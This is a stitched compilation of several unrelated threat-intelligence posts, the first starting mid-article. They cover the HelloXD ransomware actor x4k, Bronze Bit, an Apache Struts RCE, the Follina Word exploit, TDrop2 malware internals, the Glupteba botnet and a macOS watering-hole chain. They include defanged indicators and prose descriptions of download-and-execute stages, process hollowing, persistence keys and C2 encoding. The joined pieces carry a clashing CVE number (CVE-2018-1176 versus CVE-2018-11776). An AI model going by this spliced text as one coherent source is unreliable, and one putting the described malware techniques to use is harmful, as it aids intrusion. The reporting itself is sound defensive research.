"From the GitHub page, we also observed a URL to a site – xn--90a5ai[.]com(фсб[.]com) – resolving to the previously mentioned IP 164[.]68[.]114[.]29, which at this point in time only shows an animation of interconnecting points."
"That being said, when looking at the HTML source code of the site, we discovered a couple of references to the user observed before – x4kme – and other aliases such as uKn0wn, which was observed in the HelloXD ransomware samples."
Figure 17. Snippet of Script in HTML Source Code xn--90a5ai[.]comFrom the list of aliases used by the threat actor
", we were able to observe another GitHub account with the name l4ckyguy, sharing the profile picture, location and URL in the description, with a link to the previously observed account (x4kme), and a name, Ivan Topor, which we believe may be another alias for this threat actor."
"A further account, l4cky-control, was also discovered."
This repository contained a Python script that would decrypt a secondary Python script which reached out to the IP 167[.]86[.]87[.]27 to download and execute another Python script.
This particular IP was linked to a Contabo server that x4k had also included within their VirusTotal graph discussed above.
"We also found a YouTube account linked to the actor through the initial email tebya@poime[.]li, using another alias, Vanya Topor."
It’s worth pointing out that “Vanya” is a diminutive for Ivan.
"The YouTube account has no public videos, but we observed this threat actor sharing unlisted links in various hacking forums."
"The content of the videos were tutorials and walkthroughs, where the threat actor showed his methodology of performing certain actions, depending on the video."
"The videos had no sound, but the threat actor would type commentary on a terminal to address something the viewer was observing on screen."
The videos found gave us insight into x4k operations before moving into ransomware activity specifically.
"We learned how this threat actor leverages Cobalt Strike for his operations, including how to set up Beacons as well as how to send files to compromised systems."
"In one of the videos, we actually observed the threat actor performing a DNS leak test on his Android phone."
We also got to observe how the domain фсб[.]com used to look in October 2020 – a blog of sorts titled “Ghost in the Wire.”
"Where the threat actor keeps alluding to his “Ghost” theme, a similar theme was observed in the HelloXD ransomware samples (Figure 19)."
"In another video instance, we observed the threat actor submit a LockBit 2.0 sample on Cuckoo sandbox and compare the results with another presumably LockBit 2.0 sample prior to the one submitted in the video."
"At the time of writing, we don’t believe x4k is related to LockBit 2.0 activity, but we did find the choice of this particular ransomware family interesting (Figure 20)."
"We also noticed this threat actor leveraging the use of other sandboxes besides Cuckoo – such as ANY.RUN and Hybrid Analysis – to test out verdicts and tooling, alongside the use of various virtual machines."
"Additionally, this threat actor not only leverages open-source tooling, but also develops his own tools and scripts."
"We were able to see this threat actor demonstrating some of his tools performing automated actions in his videos, such as obfuscating files, creating executables and code signing (Figure 21)."
"Taking a closer look at x4k’s main OS, we believe it to be a customized Kali Linux instance, tailored to his needs."
"Most of his videos, comments, configurations and tutorials are written in Russian – and when combined with knowledge gained from a few OPSEC mistakes – Russia is also where we believe x4k originates from."
"Additionally, we encountered the ClamAV logo during one of the threat actor walkthrough videos – the same logo used on the HelloXD ransomware samples (Figure 22)."
"This time around, x4k is using the logo as the start menu for his OS enviorment."
"On the same taskbar, we also noticed the Telegram icon, which is a very popular messaging app for chatting – but is also used by threat actors such as LAPSUS$ to post news into specific channels."
"Using his username and alias and pivot, we were able to identify two Telegram accounts sharing the same picture as observed before, and descriptions pointing to the threat actor’s main site фсб[.]com."
"We noticed that the x4k Telegram account is used actively versus the old account – which, according to Telegram, hasn’t been active in a while (Figure 23)."
"x4k has a very solid online presence, which has enabled us to uncover much of his activity in these last two years."
"This threat actor has done little to hide malicious activity, and is probably going to continue this behavior."
"Unit 42 research encountered HelloXD, a ransomware family in its initial stages – but already intending to impact organizations."
"While the ransomware functionality is nothing new, during our research, following the lines, we found out the ransomware is most likely developed by a threat actor named x4k."
"Unit 42 was able to uncover additional x4k activity being linked to malicious infrastructure, and additional malware besides the initial ransomware sample, going back to 2020."
Ransomware is a lucrative operation if done correctly.
Unit 42 has observed ransom demands and average payments going up in the latest Ransomware Threat Report.
"Unit 42 believes that x4k, this threat actor, is now expanding into the ransomware business to capitalize on some of the gains other ransomware groups are making."
"Palo Alto Networks detects and prevents HelloXD and x4k activity in the following ways: If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:"
"Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members."
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance.
"435781ab608ff908123d9f4758132fa45d459956755d27027a52b8c9e61f9589 ebd310cb5f63b364c4ce3ca24db5d654132b87728babae4dc3fb675266148fe9 65ccbd63fbe96ea8830396c575926af476c06352bb88f9c22f90de7bb85366a3 903c04976fa6e6721c596354f383a4d4272c6730b29eee00b0ec599265963e74 7247f33113710e5d9bd036f4c7ac2d847b0bf2ac2769cd8246a10f09d0a41bab 4e9d4afc901fa1766e48327f3c9642c893831af310bc18ccf876d44ea4efbf1d 709b7e8edb6cc65189739921078b54f0646d38358f9a8993c343b97f3493a4d9 0e1aa5bb7cdccacfa8cbfe1aa71137b361bea04252fff52a9274b32d0e23e3aa 1fafe53644e1bb8fbc9d617dd52cd7d0782381a9392bf7bcab4db77edc20b58b 3477b704f6dceb414dad49bf8d950ef55205ffc50d2945b7f65fb2d5f47e4894 3eb1a41c86b3846d33515536c760e98f5cf0a741c682227065cbafea9d350806 4245990f42509474bbc912a02a1e5216c4eb87ea200801e1028291b74e45e43b 4de1279596cf5e0b2601f8b719b5240cb00b70c0d6aa0c11e2f32bc3ded020aa 4ea43678c3f84a66ce93cff50b11aabbe28c99c058e7043f275fea3456f55b88 5ae0d9e7ae61f3afb989aaf8e36eda1816ec44ceae666aea87a9fdc6fed35594 667b8abb731656c83f2f53815be68cce5d1ace3cb4ed242c9fecd4a66ac2f816 78ae3726d5b0815ad2e5a775ecf1a6cd36e1eeeee133b0766158a6b107ef7c34 7da83a27e4d788ca33b8b05d365fdf803cb68e0df4d69942ba9b7bde54619322 8a02f01cc3ac71b2c440148fd51b44e260a953e4fc1ee1c3fe787395b8c712ab 963cacd7eeebfb09950668bf1c6adf5452b992fc09119835cd256c5d3cf17f91 a57b1cfd3e801305856cdb75839de05f03439e264ccdbd1497685878a2605b5a bd111240c24a6a188f2664eb15195630b13aa6d9483fc8cfed339dddf803fd4e d8026801e1b78d9bdcb4954c194748d0fdc631594899b29a2746ae425b8bfc79 d8db562070b06d835721413a98f757b88d59277bf638467fda2ee254afc692a0 d97d666239cc973a38dc788bf017f5d8ae19257561888b61ecff8e086c4e3ea0 19d7e899777fbe432b2c90b992604599706b4109c3ceaa7946e8548f4c190a19 1dbf8ae62cc90c837ba12ceee08a1d989732a95bdcef5ca18151ef698ed98a03 22b32bb7c791842a6aa604d08208b13db07ccd1fe81f47ea8369537addb26c7b 26019b86686c1038326f075663d79803e4412bf9952eae65d7b9278be74ac55c 26cccc7e9155bd746e3bb963d40d6edfc001e6d936faf9392202e3788996105a 43fa55c88453db0de0c22f3eb0b11d1db9286f3ee423e82704fdce506d3af516 4564ca0c436fde9e76f5fa65cbcf483adf1fbfa3d7369b7bb67d2c95457f6bc5 585a22e822ade633cee349fd0a9e6a7d083de250fb56189d5a29d3fc5468680c 592b1e55ceef3b8a1ecb28721ebf2e8edd109b9b492cf3c0c0d30831c7432e00 611f3b0ed65dc98a0d7f5c57512212c6ab0a5de5d6bbf7131d3b7ebf360773c6 6b437208dfb4a7906635e16a5cbb8a1719dc49c51e73b7783202ab018181b616 6e8ececfdc74770885f9dc63b4b2316e8c4a011fd9e382c1ba7c4f09f256925d 99f97a47d8d60b8fa65b4ddaf5f43e4352765a91ab053ceb8a3162084df7d099 9e2524b2eaf5248eed6b2d20ae5144fb3bb543647cf612e5ca52135d16389f1a c15111a5f33b3c51a26f814b64c891791ff21104ee75a4773fef86dfc7a8e7ca cd9908f50c9dd97a2ce22ee57ba3e014e204369e5b75b88cefb270dc44a5ca50 ddc96ac931762065fc085be8138c38f2b6b52095a42b34bc415c9572de17386a e9b832fa02235b95a65ad716342d01ae87fcdb686b448e8462d6e86c1f4b3156 f055577220c7dc4be46510b9fed4ecfa78920025d1b2ac5853b5bf7ea136cf37 f7ae6b5ed444abfceda7217b9158895ed28cfdd946bf3e5c729570a5c29d5d82 b843d7498506ddc272e183bbe90cf73cc4779b37341108e002923aa938ca9169 77dec8fc40ff9332eb6d40ded23d606c88d9fa3785a820ea7b1ef0d12a5c4447 f52fb7ba5061ee4144439ff652c0b4f3cf941fe37fbd66e9d7672dd213fbcdb2 beee37fb9cf3e02121b2169399948c1b0830a626d4ed27a617813fa67dd91d58 b4c11c97d23ea830bd13ad4a05a87be5d8cc55ebdf1e1b458fd68bea71d80b54 f1425cff3d28afe5245459afa6d7985081bc6a62f86dce64c63daeb2136d7d2c c619edb3fa8636c50b59a42d0bdc4c71cbd46a0586b683773e9a5e509f688176 50a479f16713d03b95103e0a95a3d575b7263bd16c334258eefa3ae8f46e3d1d 83b5c6d73f3fc893dbd7effa7c50dc9b2455ec053aa9c51d70e13305ecf21fa4 02894fa01c9b82dcfd93e35f49a0d5408f7f4f8a25f33ad17426bb00afa71f63 98ba86c1273b5e8d68ce90ac1745d16335c5e04ec76e8c58448ae6c91136fc4d 5fa5b5dddfe588791b59c945beba1f57a74bd58b53a09d38ac8a8679a0541f16 164[.]68[.]114[.]29 167[.]86[.]87[.]27 63[.]250[.]53[.]180 45[.]15[.]19[.]130 46[.]39[.]229[.]17 www.zxlab.iol4cky[.]men btc-trazer[.]xyz sandbox[.]x4k[.]me malware[.]x4k[.]me f[.]x4k[.]me 0[.]x4k[.]me pwn[.]x4k[.]me docker[.]x4k[.]me apk[.]x4k[.]me x4k[.]me powershell[.]services vmi378732[.]contaboserver[.]net x4k[.]in L4cky[.]men m[.]x4k[.]me mx2[.]l4cky[.]com mailhost[.]l4cky[.]com www1[.]l4cky[.]com authsmtp[.]l4cky[.]com ns[.]l4cky[.]com mailer[.]l4cky[.]com imap2[.]l4cky[.]com ns2[.]l4cky[.]com server[.]l4cky[.]com auth[.]l4cky[.]com remote[.]l4cky[.]com mx10[.]l4cky[.]com ms1[.]l4cky[.]com mx5[.]l4cky[.]com relay2[.]l4cky[.]com ns1[.]l4cky[.]com email[.]l4cky[.]com imap[.]l4cky[.]com mail[.]x4k[.]me repo[.]x4k[.]me bw[.]x4k[.]me collabora[.]x4k[.]me cloud[.]x4k[.]me yacht[.]x4k[.]me book[.]x4k[.]me teleport[.]x4k[.]me subspace[.]x4k[.]me windows[.]x4k[.]me sf[.]x4k[.]me dc-b00e12923fb6.l4cky[.]men box[.]l4cky[.]men mail[.]l4cky[.]men www[.]l4cky[.]men mta-sts[.]l4cky[.]men ldap[.]l4cky[.]men cloud[.]l4cky[.]men office[.]l4cky[.]men rexdooley[.]ml relay2[.]kuimvd[.]ru ns2[.]webmiting[.]ru https://фсб[.]com 2022 Unit 42 Ransomware Threat Report Highlights Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) A recent vulnerability in the Kerberos authentication protocol, CVE-2020-17049 (dubbed Bronze Bit), has been disclosed by Microsoft."
The vulnerability is in the way that the Key Distribution Center (KDC) handles service tickets and validates whether delegation is allowed.
"In the attack, as detailed in the Palo Alto Networks Security Operations blog, “Protecting Against the Bronze Bit Vulnerability with Cortex XDR,” the attacker tampers with the Kerberos service ticket, which allows the attacker to authenticate to the target as any user, including sensitive accounts and members of the “Protected Users” group."
"The vulnerability was patched by Microsoft, and the patch will be gradually deployed with upcoming Windows updates."
"Microsoft aims to enforce using the patch only on or after May 11, 2021."
Palo Alto Network customers running Cortex XDR version 7.3 with the latest content update are protected from “Pass-the-Ticket” attacks using the standard Windows API.
Customers running Cortex XDR Pro with analytics enabled will get alerted on related suspicious activities and specifically on a delegation from or to a protected user. Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available.
"Sign up to receive the latest news, cyber threat intelligence and research from us"
Please enter your email address!
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Situation Overview
"On August 22, 2018, the Apache Foundation released a critical security update for CVE-2018-1176, a remote code execution vulnerability affecting Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16."
The Apache Foundation has urged everyone to apply the security updates as soon as possible.
This blog is to provide information to help organizations assess their risk of the vulnerability and to inform Palo Alto Networks customers of protections in place that can help mitigate their risk until they can apply the security updates.
"Palo Alto Networks customers who have deployed the latest vulnerability signatures released on August 24, 2018, are protected."
Vulnerability Information
"According to both the Apache Foundation and security researcher Man Yue Mo, this vulnerability can enable remote code execution on a server running a vulnerable version of Apache Struts."
The method of attack would be through a specially crafted URL sent to the vulnerable system.
"In most cases, this means no authentication is required to exploit the vulnerability."
A successful attack would run code in the security context that Struts is using.
"In some cases, this could effectively lead to a total compromise of the system."
"It’s important to note, however, that the vulnerability is not exploitable in default configurations."
"The following two conditions must both be met for a system to be vulnerable to attack: If your Struts application does not meet both of these conditions, your application may still be vulnerable but not (currently) exploitable via CVE-2018-11776."
"In particular, if your application uses the popular Struts Convention plugin, it appears to potentially increase your risk of exploitability vis-à-vis other Struts implementations that do not use that plugin."
Threat Environment Information
The vulnerability was disclosed on August 22 in conjunction with security updates that address it.
There is detailed information about the vulnerability and how to exploit it available currently.
There is also proof of concept (PoC) code available already.
"As noted above, the PoC works only against systems that are vulnerable and meet both conditions for exploitability."
Some have noted that a previous critical Struts vulnerability was actively attacked last year only three days after the release of the security update and vulnerability information.
"There are no known active attacks at this time and the current requirement that two, non-default conditions need to be met for the vulnerability to be exploitable makes for a different threat environment."
"However with active PoC available we can expect at the minimum probing, if not active exploitation of this vulnerability in the near term."
Organizations should focus their risk assessments for possible attack until they can patch on four things: Guidance and Protections for Palo Alto Networks Customers
All organizations running vulnerable versions of Apache Struts should deploy the security updates as soon as possible.
"Organizations can and should prioritize scheduling and deployment of the security updates based on their security policy and risk assessment, and on currently available information."
"Palo Alto Networks customers who have deployed vulnerability signatures in content release version 8057 released on August 24, 2018, which include ID 33948 Name: Apache Struts 2 Remote Code Execution Vulnerability, are protected against currently known exploits against that vulnerability."
"Our customers should still deploy the security update as recommended above, but can and should deploy the latest vulnerability signature immediate for additional protection."
"With this addition protection available, our customers can and should include that as part of their decisions around security and deployment of the security updates and their risk assessment of the vulnerability and threat environment."
"As always, we are monitoring the situation closely and will provide additional details as they become available. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese)
"On May 27, 2022, details began to emerge of malicious Word documents leveraging remote templates to execute PowerShell via the ms-msdt Office URL protocol."
The use of this technique appeared to allow attackers to bypass local Office macro policies to execute code within the context of Word.
Microsoft has since released protection guidance and assigned CVE-2022-30190 to this vulnerability.
"Due to the amount of publicly available information, ease of use, and the extreme effectiveness of this exploit, Palo Alto Networks is providing this threat brief to make our customers aware of this critical vulnerability and the options available to ensure proper protections are put into place until a patch can be issued by Microsoft. The vulnerability enables remote code execution with the same privileges as the calling application and there are proof-of-concept examples of zero-click variants."
"Therefore, exploits for this vulnerability have potential to be of high impact."
We highly recommend following Microsoft’s guidance to protect your enterprise until a patch is issued to fix the problem.
"All known samples and URLs associated with this attack have been flagged in the Palo Alto Networks product suite so customers can receive protections. Attack Details for CVE-2022-30190 CVE-2022-30190 in the Wild Conclusion On May 27, 2022, a cybersecurity research team out of Tokyo, Japan, nao_sec, uncovered a malicious Word document uploaded to VirusTotal from an IP in Belarus."
The document was abusing the Microsoft Word remote template feature to retrieve a malicious HTML file that subsequently used the ms-msdt Office URI scheme to execute PowerShell within the context of Word.
"On May 30, Keven Beaumont wrote an article detailing the specifics of the initial incident."
"The important thing to note here is that the decoy Word document had nothing inherently malicious outside of the link to the template hosted at hxxp://xmlformats[.]com, allowing it to bypass EDR solutions."
The HTML code from the remote template is shown in Figure 1 below.
"The JavaScript embedded within the HTML uses the ms-msdt schema to invoke the PCWDiagnostic pack, to reference the IT_BrowseForFile to execute the base64-encoded PowerShell Invoke-Expression command. The base64-decoded text within the PowerShell Invoke-Expression is shown in Figure 2 below."
This code does a few things.
First it kills the msdt.exe process.
"Then the code loops through the files within a .rar archive looking for a CAB file (TVNDRgAAAA base64 decodes to MSCF, which is the magic header of a CAB file)."
"It then stores it in a file called 1.t. 1.t, which gets base64 decoded to 1.c, expanded to rgb.exe and then finally executed."
None of the reports we’ve seen have recovered the final payload.
"Therefore, the contents are unknown."
"The use of remote templates to deliver malicious documents is not new, however, historically they’ve been used to host .docm or dotm (macro-enabled Word documents), which would still be affected by the local systems’s Word macro policy."
"Therefore, the vulnerability of particular note in this attack lies in calling the Microsoft Support Diagnostic Tool (MSDT) using the ms-msdt URL Protocol within Word via the remotely loaded template file."
"This allows execution of code within the context of Microsoft Word, even if macros are disabled."
"Protected View was triggered during execution of the nao_sec example, however, John Hammond demonstrated you can bypass Protected View by using an RTF file instead."
This allows the attack to succeed even if the user simply views the file in the preview pane – with no clicks on the document necessary – making the attack much more dangerous.
Microsoft has since released protection guidance and assigned CVE-2022-30190 to this vulnerability.
"They provided a workaround to disable the MSDT URL protocol, however, this may break other diagnostic tools that rely on the MSDT URL protocol to operate."
They also recommend ensuring cloud-delivered protections and automatic sample submission for Microsoft Defender are enabled.
Microsoft recommends that customers of Microsoft Defender for Endpoint enable the attack surface reduction rule BlockOfficeCreateProcessRule.
"So far, Palo Alto Networks is only seeing indications of testing within our customer telemetry indicated by final payload execution of benign executables such as calc.exe and notepad.exe."
Palo Alto Networks and Unit 42 will continue to monitor for evidence of exploitation and further novel use cases.
"Based on the amount of publicly available information, the ease of use and the extreme effectiveness of this exploit, Palo Alto Networks highly recommends following Microsoft’s guidance to protect your enterprise until a patch is issued to fix the problem."
"Next-Generation Firewalls (PA-Series, VM-Series and CN-Series) or Prisma Access with a Threat Prevention security subscription can automatically block sessions related to this vulnerability using Threat ID 92623 (Application and Threat content update 8575). WildFire and Cortex XDR categorize all known samples we’ve come across as malware."
Cortex XDR Agent 7.5 and higher (with content version 540-92526) prevents attempts to exploit this vulnerability with the Behavioral Threat Protection module.
The Cortex XSOAR “CVE-2022-30190 - MSDT RCE” playbook helps speed up the discovery and remediation of compromised hosts within the network.
The playbook can be found on the XSOAR marketplace.
"Additionally, all encountered URLs have been flagged as malware within PAN-DB, the Advanced URL Filtering URL database."
Customers can leverage this service with best practice configuration for further protection.
"If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: As further information or detections are put into place, Palo Alto Networks will update this publication accordingly."
"Updated June 3, 2022, at 3:30 p.m. PT."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Palo Alto Networks recently identified a new campaign targeting the transportation sector in Europe with ties to the Dark Seoul and Operation Troy campaigns that took place in 2013.
This new campaign used updated instances of the Tdrop malware family discovered in the Operation Troy campaign.
"For more information on the new campaign discovered by Unit 42, please refer to our recent blog post."
"In this attack, attackers embedded the TDrop2 malware inside a legitimate video software package hosted on the software distributor’s website."
"By doing this, they were able to target organizations that relied on the distributor’s security camera solution and infect their systems with malware."
"They created a true Trojan horse, which sneaks into a network as a gift, but when opened, the attacker’s army leaps out."
"The malware used for the attempted infection purported to be a legitimate video player, providing viewing software for security camera solutions."
The following two unique file names were involved in the attack.
The difference between the files involves the specific video player that was dropped and executed during runtime.
Each file would drop and execute the full or light version of the legitimate video player respective to the file name.
"Both the legitimate copy of the video player, as well as a malicious executable were bundled into a single executable."
"These files were added to the end of the Trojan executable, as seen below."
"When initially run, the malware checks to see if its parent process is either explorer.exe or cmd.exe."
"In the event the malware is not running in the context of either of these processes, it will exit."
This check exists in a number of the subsequent processes/executables used by the TDrop2 malware variant.
"Subsequently, the malware proceeds to extract both the video player and the embedded malware using a series of calls to CreateFile, CreateFileMapping, GetFileSize, and MapViewOfFile."
"Once extracted, the file writes it to a new file on disk prior to executing it."
"The video player is written to one of the following locations, based on the original filename: The malware itself is written to the %TEMP% directory as well."
The filename is derived by randomly choosing an executable name from the system32 directory.
The randomly chosen executable must not contain any of the following strings: This dropped malware begins by performing the same parent process check witnessed in the original sample.
"In the event the malware is not running within the parent process of cmd.exe or explorer.exe, it will exit immediately."
This malware sample will also dynamically load a number of functions and libraries.
"After the kernel32.dll and ntdll.dll libraries are loaded via calls to GetModuleHandle, the following process takes place:"
"In total, the following 14 functions are loaded during runtime:"
"After these functions are loaded, the malware will randomly select an executable from the system32 using the same routine witnessed in the earlier sample."
The malware proceeds to spawn a new process of the selected executable and performs a technique called process hollowing to hide itself inside a legitimate executable.
This leads us to the next stage of our malware This particular stage of malware acts as a downloader.
The parent process check is not used in this particular sample.
The malware initially attempts to download a file from the following location:
"While the link above shows a file extension of an image, the transferred file is in fact a modified executable file. The downloaded file has the first two bytes of the PE file format replaced with the characters ‘DW’, instead of the usual ‘MZ’."
"After the download occurs, the malware immediately corrects the first two bytes with the ‘MZ’ characters prior to writing the file to disk."
The downloaded file is dropped to the system32 folder.
The malware selects a randomly chosen DLL from this directory.
The base name of this DLL is used to write the downloaded file.
"As an example, in the event apcups.dll was selected, the malware would write the downloaded file to apcups.exe in the same folder."
The downloader then proceeds to execute this downloaded file in a new process.
"As we’ve seen in previous samples, this executable file begins by checking the parent process for the presence of ‘cmd.exe’ or ‘explorer.exe’."
"It proceeds to randomly select an executable file in the system32 folder, and performs process hollowing against it."
The injected executable contains the last stage of the TDrop2 malware variant.
"Upon execution, we once again see the parent process check to determine if the malware is running within the ‘cmd.exe’ or ‘explorer.exe’ parent process."
It continues to dynamically load a number of libraries and functions for later use.
A feature that has yet to be seen is that of string encryption.
"Strings are encrypted using the following function, represented in Python:"
"After dynamically loading functions and libraries, the malware iterates through the running processes and attempts to determine if the ‘V3lite.exe’ process is running."
This process name is associated with the South Korean-based AhnLab security software provider.
"In the event this process is running, the malware will attempt to kill the process’ class window."
The final payload proceeds to generate the following mutex to ensure only one copy of the malware is running concurrently: Global\SPPLMUTEX The payload then spawns two threads—one to maintain persistence and another to gather victim information and perform command and control operations.
Persistence is achieved by setting the following registry key: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run The name of the registry key in the above instances is derived from the basename of the supplied argument.
"In the event the supplied argument was C:\malware.exe, the registry key would be named ‘malware’, and the path for this key would be ‘C:\malware.exe’. The persistence thread runs in a loop where the registry keys are set every 60 seconds, ensuring persistence even in the event an administrator manually deletes the registry keys."
"The other thread begins by collecting information about the victim, such as the following: These data points are used to generate a unique victim ID, which is stored in the following registry key: HKCU\SOFTWARE\Microsoft\HY08A\Build The malware will continue to decrypt and store embedded C2 URLs."
The following URLs have been identified:
The final payload proceeds to enter its command and control loop.
It initially performs a DNS check against microsoft.com to ensure it has Internet connectivity.
"After this check is performed, it enters an infinite loop, with a sleep interval set at a default of 30 minutes."
The malware will periodically poll the C2 server and determine if any commands are received.
The initial POST request contains a unique victim identifier that was previously generated.
The optional response by the C2 server is both encoded and encrypted. The data is first encrypted using an unidentified algorithm.
The two keys used for this encryption are generated using another unidentified algorithm.
The following Python script can be used to generate the keys.
A default salt of ‘FFFFFFFF’ is used.
"Additionally, the following Python script can be used for encryption/decryption"
"After the data is encrypted, it is then base64-encoded using a custom alphabet."
The following alphabet is used: 3bcd1fghijklmABCDEFGH-J+LMnopq4stuvwxyzNOPQ7STUVWXYZ0e2ar56R89K/
"When the previously mentioned C2 response is both decoded and decrypted, we are presented with the following data: The command structure of the C2 response always begins with the string ‘tick’"
The number following this string is most likely a unique command identifier.
"The malware will store these command identifiers in the following files: In the event the number after the tick was previously witnessed, the command from the C2 will be ignored."
The remaining lines are then parsed.
"The following commands are supported: Once again, using the previous example, the malware will first ensure that the command was not previously parsed/executed."
"In the event it is new, it will proceed to execute the various reconnaissance commands found on line #2."
The results of these commands are uploaded to the C2 server.
"As we can see in the above network traffic, the malware attempts to disguise the data as a .gif image."
"Finally, the malware will parse the third line, which instructs the malware to modify the wait interval to a value of ‘60’."
"This interval value is set in the following registry key: HKCU\Software\Microsoft\HY08A\Policy Additionally, in the event the C2 response instructs the malware to update C2 URLs, it will be in the following format: 1001; [unique_identifier] [url] The malware will encrypt the URL string with a 4-byte XOR key of “\x01\x02\x03\x04” and store this data in the following registry key: HKCU\Software\Microsoft\HY08A\[unique_identifier] The TDrop2 malware family that was witnessed in a recent attack against a European transportation company provided a minimal set of commands to the attackers."
"It was most likely used to establish a foothold, perform reconnaissance and deploy further malware into the victim’s network."
"While the malware lacked a large set of capabilities, it had a wealth of interesting and advanced features, such as the custom encryption/encoding witnessed in the network traffic, the use of process hollowing against a randomly selected Microsoft Windows binary, and the downloading component that attempted to bypass network security measures by modifying the executable header."
We created the AutoFocus tag TDrop2 to identify samples of this new variant and added known C2 domains and hash values to the Threat Prevention product set.
"At this time, WildFire is able to correctly identify the samples associated with this campaign as malicious."
Stage 1 Stage 2 Stage 3 Stage 4 Stage 5
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q1 2022.
"It was last updated on May 12, 2022."
Google TAG actively monitors threat actors and the evolution of their tactics and techniques.
We use our research to continuously improve the safety and security of our products and share this intelligence with the community to benefit the internet as a whole.
"As announced today, Google has taken action to disrupt the operations of Glupteba, a multi-component botnet targeting Windows computers."
We believe this action will have a significant impact on Glupteba's operations.
"However, the operators of Glupteba are likely to attempt to regain control of the botnet using a backup command and control mechanism that uses data encoded on the Bitcoin blockchain."
"Glupteba is known to steal user credentials and cookies, mine cryptocurrencies on infected hosts, deploy and operate proxy components targeting Windows systems and IoT devices."
"TAG has observed the botnet targeting victims worldwide, including the US, India, Brazil and Southeast Asia."
The Glupteba malware family is primarily distributed through pay per install (PPI) networks and via traffic purchased from traffic distribution systems (TDS).
"For a period of time, we observed thousands of instances of malicious Glupteba downloads per day."
The following image shows a webpage mimicking a software crack download which delivers a variant of Glupteba to users instead of the promised software.
"While analyzing Glupteba binaries, our team identified a few containing a git repository URL: “git.voltronwork.com”."
"This finding sparked an investigation that led us to identify, with high confidence, multiple online services offered by the individuals operating the Glupteba botnet."
"These services include selling access to virtual machines loaded with stolen credentials (dont[.]farm), proxy access (awmproxy), and selling credit card numbers (extracard) to be used for other malicious activities such as serving malicious ads and payment fraud on Google Ads."
"This past year, TAG has been collaborating with Google’s CyberCrime Investigation Group to disrupt Glupteba activity involving Google services."
"We’ve terminated around 63M Google Docs observed to have distributed Glupteba, 1,183 Google Accounts, 908 Cloud Projects, and 870 Google Ads accounts associated with their distribution."
"Furthermore, 3.5M users were warned before downloading a malicious file through Google Safe Browsing warnings."
"In the last few days, our team partnered with Internet infrastructure providers and hosting providers, including Cloudflare, to disrupt Glupteba’s operation by taking down servers and placing warning interstitial pages in front of the malicious domain names."
"During this time, an additional 130 Google accounts associated with this operation were terminated."
"Parallel to the analysis, tracking, and technical disruption of this botnet, Google has filed a lawsuit against two individuals believed to be located in Russia for operating the Glupteba Botnet and its various criminal schemes."
"Google is alleging violations under the Racketeer Influenced and Corrupt Organizations Act (RICO), the Computer Fraud and Abuse Act, the Electronic Communications Privacy Act, the Lanham Act, and tortious interference of business relationships, and unjust enrichment."
"While these actions may not completely stop Glupteba, TAG estimates that combined efforts will materially affect the actor’s ability to conduct future operations."
The command and control (C2) communication for this botnet uses HTTPS to communicate commands and binary updates between the control servers and infected systems.
"To add resilience to their infrastructure, the operators have also implemented a backup mechanism using the Bitcoin blockchain."
"In the event that the main C2 servers do not respond, the infected systems can retrieve backup domains encrypted in the latest transaction from the following bitcoin wallet addresses: The following 32 byte AES keys for decryption are hard coded in the binaries: The blockchain transaction’s OP_RETURN data can be decrypted using AES-256 GCM to provide a backup command and control domain name."
"The first 12 bytes of the OP_RETURN contains the IV, the last 16 bytes the GCM tag, while the middle section is the AES-256 GCM encrypted domain"
"Full details of Glupteba’s network protocol can be found in this report from 2020, the following Python script illustrates how one can decrypt an encrypted domain name:"
Recent domains used for command and control:
Recent sha256 hashes of malware samples:
This bulletin includes coordinated influence operation campaigns terminated on our platforms in Q4 2021.
"It was last updated on February 7, 2022."
"To protect our users, TAG routinely hunts for 0-day vulnerabilities exploited in-the-wild."
"In late August 2021, TAG discovered watering hole attacks targeting visitors to Hong Kong websites for a media outlet and a prominent pro-democracy labor and political group."
"The watering hole served an XNU privilege escalation vulnerability (CVE-2021-30869) unpatched in macOS Catalina, which led to the installation of a previously unreported backdoor."
"As is our policy, we quickly reported this 0-day to the vendor (Apple) and a patch was released to protect users from these attacks."
"Based on our findings, we believe this threat actor to be a well-resourced group, likely state backed, with access to their own software engineering team based on the quality of the payload code."
In this blog we analyze the technical details of the exploit chain and share IOCs to help teams defend against similar style attacks.
The websites leveraged for the attacks contained two iframes which served exploits from an attacker-controlled server—one for iOS and the other for macOS.
iOS Exploits
The iOS exploit chain used a framework based on Ironsquirrel to encrypt exploits delivered to the victim's browser.
"We did not manage to get a complete iOS chain this time, just a partial one where CVE-2019-8506 was used to get code execution in Safari."
macOS Exploits
The macOS exploits did not use the same framework as iOS ones.
The landing page contained a simple HTML page loading two scripts—one for Capstone.js and another for the exploit chain.
The parameter rid is a global counter which records the number of exploitation attempts.
This number was in the 200s when we obtained the exploit chain.
"While the javascript starting the exploit chain checks whether visitors were running macOS Mojave (10.14) or Catalina (10.15) before proceeding to run the exploits, we only observed remnants of an exploit when visiting the site with Mojave but received the full non-encrypted exploit chain when browsing the site with Catalina."
"The exploit chain combined an RCE in WebKit exploiting CVE-2021-1789 which was patched on Jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in XNU (CVE-2021-30869) patched on Sept 23, 2021."
